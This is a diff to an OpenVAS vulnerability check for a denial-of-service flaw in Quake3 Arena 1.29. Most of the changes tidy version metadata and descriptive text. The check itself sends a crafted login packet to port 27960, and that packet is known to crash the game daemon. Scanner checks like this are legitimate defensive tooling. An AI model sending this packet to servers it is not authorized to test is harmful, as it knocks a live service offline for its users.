@@ -1,6 +1,5 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: quake3_dos.nasl 4904 2017-01-02 12:45:48Z cfi $
 #
 # Quake3 Arena 1.29 f/g DOS
 #
@@ -31,8 +30,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.10931");
-  script_version("$Revision: 4904 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-01-02 13:45:48 +0100 (Mon, 02 Jan 2017) $");
+  script_version("2019-04-24T07:26:10+0000");
+  script_tag(name:"last_modification", value:"2019-04-24 07:26:10 +0000 (Wed, 24 Apr 2019)");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(3123);
   script_tag(name:"cvss_base", value:"5.0");
@@ -45,17 +44,13 @@ if(description)
   script_dependencies("find_service.nasl");
   script_require_ports(27960);
 
-  tag_summary = "It was possible to crash the Quake3 Arena daemon by sending a specially
-  crafted login string.";
+  script_tag(name:"solution", value:"Upgrade your software.");
 
-  tag_impact = "A cracker may use this attack to make this service crash continuously, 
-  preventing you from playing.";
+  script_tag(name:"summary", value:"It was possible to crash the Quake3 Arena daemon by sending a specially
+  crafted login string.");
 
-  tag_solution = "Upgrade your software";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
-  script_tag(name:"impact", value:tag_impact);
+  script_tag(name:"impact", value:"A cracker may use this attack to make this service crash continuously,
+  preventing you from playing.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -64,9 +59,12 @@ if(description)
 }
 
 port = 27960;
-if( ! get_port_state( port ) ) exit( 0 );
+if( ! get_port_state( port ) )
+  exit( 0 );
+
 soc = open_sock_tcp( port );
-if( ! soc ) exit( 0 );
+if( ! soc )
+  exit( 0 );
 
 s = string( raw_string( 0xFF, 0xFF, 0xFF, 0xFF ), "connectxx" );
 send( socket:soc, data:s );
